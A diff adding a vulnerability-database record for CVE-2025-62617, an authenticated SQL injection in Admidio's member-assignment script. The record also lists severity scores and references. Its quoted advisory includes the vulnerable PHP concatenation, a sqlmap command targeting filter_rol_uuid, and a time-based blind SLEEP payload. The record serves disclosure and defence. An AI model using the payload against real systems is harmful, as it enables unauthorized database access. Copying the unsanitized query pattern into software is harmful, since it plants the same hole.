@@ -1,0 +1,185 @@
+vulnerability_id: VCID-u2ya-njwp-4bey
+aliases:
+  - CVE-2025-62617
+  - GHSA-2v5m-cq9w-fc33
+summary: "Admidio Vulnerable to Authenticated SQL Injection in Member Assignment Functionality\n\
+  ### Summary\n\nAn authenticated SQL injection vulnerability exists in the member assignment\
+  \ data retrieval functionality of Admidio. Any authenticated user with permissions to assign\
+  \ members to a role (such as an administrator) can exploit this vulnerability to execute arbitrary\
+  \ SQL commands. This can lead to a full compromise of the application's database, including\
+  \ reading, modifying, or deleting all data. The vulnerability is present in the latest version,\
+  \ 4.3.16.\n\n### Details\n\nThe vulnerability is located in the `adm_program/modules/groups-roles/members_assignment_data.php`\
+  \ script. This script handles an AJAX request to fetch a list of users for role assignment.\
+  \ The `filter_rol_uuid` GET parameter is not properly sanitized before being used in a raw\
+  \ SQL query.\n\n**File:** `adm_program/modules/groups-roles/members_assignment_data.php`\n\
+  ```php\n// ... \n// The parameter is retrieved from the GET request without sufficient sanitization\
+  \ for SQL context.\n$getFilterRoleUuid = admFuncVariableIsValid($_GET, 'filter_rol_uuid',\
+  \ 'string');\n$getMembersShowAll = admFuncVariableIsValid($_GET, 'mem_show_all', 'bool', array('defaultValue'\
+  \ => false));\n\n// ... \n$filterRoleCondition = '';\nif ($getMembersShowAll) {\n    $getFilterRoleUuid\
+  \ = 0;\n} else {\n    // show only members of current organization\n    if ($getFilterRoleUuid\
+  \ !== '') {\n        // VULNERABLE CODE: $getFilterRoleUuid is directly concatenated into\
+  \ the query string.\n        $filterRoleCondition = ' AND rol_uuid = \\''.$getFilterRoleUuid\
+  \ . '\\'';\n    }\n}\n\n// ...\n// The vulnerable $filterRoleCondition is then used inside\
+  \ a subselect.\n$sqlSubSelect = '(SELECT COUNT(*) AS count_this\n                    FROM\
+  \ '.TBL_MEMBERS.'\n              INNER JOIN '.TBL_ROLES.'\n                      ON rol_id\
+  \ = mem_rol_id\n              INNER JOIN '.TBL_CATEGORIES.'\n                      ON cat_id\
+  \ = rol_cat_id\n                   WHERE mem_usr_id  = usr_id\n                     AND mem_begin\
+  \  <= \\''.DATE_NOW.'\\'\n                     AND mem_end     > \\''.DATE_NOW.'\\'\n    \
+  \                     '.$filterRoleCondition.'\n                     AND rol_valid = true\n\
+  \                     AND cat_name_intern <> \\'EVENTS\\'\n                     AND cat_org_id\
+  \ = '.$gCurrentOrgId.')';\n// ...\n```\n\nAs shown above, the value of `$getFilterRoleUuid`\
+  \ is directly concatenated into the `$filterRoleCondition` variable, which is then embedded\
+  \ within a larger SQL query (`$sqlSubSelect`). This allows an attacker to break out of the\
+  \ string literal and inject arbitrary SQL commands.\n\n### PoC (Proof of Concept)\n\n**Prerequisites:**\n\
+  1.  A running instance of Admidio (tested on version 4.3.16).\n2.  An authenticated user session\
+  \ with permissions to assign members to a role (e.g., the default 'admin' user).\n\n**Execution:**\n\
+  The vulnerability can be triggered by manipulating the `filter_rol_uuid` parameter in the\
+  \ request to `/adm_program/modules/groups-roles/members_assignment_data.php`. Due to the large\
+  \ number of parameters, the easiest way to reproduce this is by capturing a legitimate request\
+  \ and replaying it with `sqlmap`.\n\n1.  Log in to Admidio as an administrator.\n2.  Navigate\
+  \ to `Groups / Roles`.\n3.  Click the \"Assign members\" icon for any existing role.\n4. \
+  \ Using a web proxy like Burp Suite, intercept the GET request made to `/adm_program/modules/groups-roles/members_assignment_data.php`.\n\
+  5.  Save the entire raw request to a text file (e.g., `admidio_request.txt`).\n6.  Run the\
+  \ following `sqlmap` command to confirm the time-based blind SQL injection:\n\n```bash\nsqlmap\
+  \ -r /path/to/admidio_request.txt -p filter_rol_uuid --technique=T --dbms=mysql --current-db\n\
+  ```\n\n**Result:**\n`sqlmap` will successfully identify and exploit the time-based blind SQL\
+  \ injection vulnerability.\n\n```\n---\nParameter: filter_rol_uuid (GET)\n    Type: time-based\
+  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: role_uuid=...&filter_rol_uuid='\
+  \ AND (SELECT 3332 FROM (SELECT(SLEEP(5)))vqnl) AND 'ENdG'='ENdG&...\n---\n[INFO] the back-end\
+  \ DBMS is MySQL\nback-end DBMS: MySQL >= 5.0.12\n[INFO] fetching current database\n[INFO]\
+  \ retrieved: admidio\ncurrent database: 'admidio'\n```\nThis confirms that an attacker can\
+  \ execute arbitrary SQL queries and extract information from the database."
+severities:
+  - score: '0.00023'
+    scoring_system: epss
+    scoring_elements: '0.04706'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.00023'
+    scoring_system: epss
+    scoring_elements: '0.04714'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.00023'
+    scoring_system: epss
+    scoring_elements: '0.04737'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.00027'
+    scoring_system: epss
+    scoring_elements: '0.06277'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.00027'
+    scoring_system: epss
+    scoring_elements: '0.06252'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.0003'
+    scoring_system: epss
+    scoring_elements: '0.07508'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.0003'
+    scoring_system: epss
+    scoring_elements: '0.07511'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.0003'
+    scoring_system: epss
+    scoring_elements: '0.07498'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.00035'
+    scoring_system: epss
+    scoring_elements: '0.0996'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '0.00035'
+    scoring_system: epss
+    scoring_elements: '0.09967'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/Admidio/admidio
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/Admidio/admidio
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/Admidio/admidio/commit/fde81ae869e88a3cf42201f2548d57df785a37cb
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/Admidio/admidio/commit/fde81ae869e88a3cf42201f2548d57df785a37cb
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2025-10-23T16:03:08Z/
+    published_at: None
+    url: https://github.com/Admidio/admidio/commit/fde81ae869e88a3cf42201f2548d57df785a37cb
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/Admidio/admidio/security/advisories/GHSA-2v5m-cq9w-fc33
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/Admidio/admidio/security/advisories/GHSA-2v5m-cq9w-fc33
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/Admidio/admidio/security/advisories/GHSA-2v5m-cq9w-fc33
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2025-10-23T16:03:08Z/
+    published_at: None
+    url: https://github.com/Admidio/admidio/security/advisories/GHSA-2v5m-cq9w-fc33
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-2v5m-cq9w-fc33
+  - score: '7.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-62617
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-62617
+weaknesses:
+  - CWE-89
+  - CWE-1035
+  - CWE-937
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-62617
+    reference_type:
+    reference_id:
+  - url: https://github.com/Admidio/admidio
+    reference_type:
+    reference_id:
+  - url: https://github.com/Admidio/admidio/commit/fde81ae869e88a3cf42201f2548d57df785a37cb
+    reference_type:
+    reference_id:
+  - url: https://github.com/Admidio/admidio/security/advisories/GHSA-2v5m-cq9w-fc33
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-62617
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-2v5m-cq9w-fc33
+    reference_type:
+    reference_id: GHSA-2v5m-cq9w-fc33
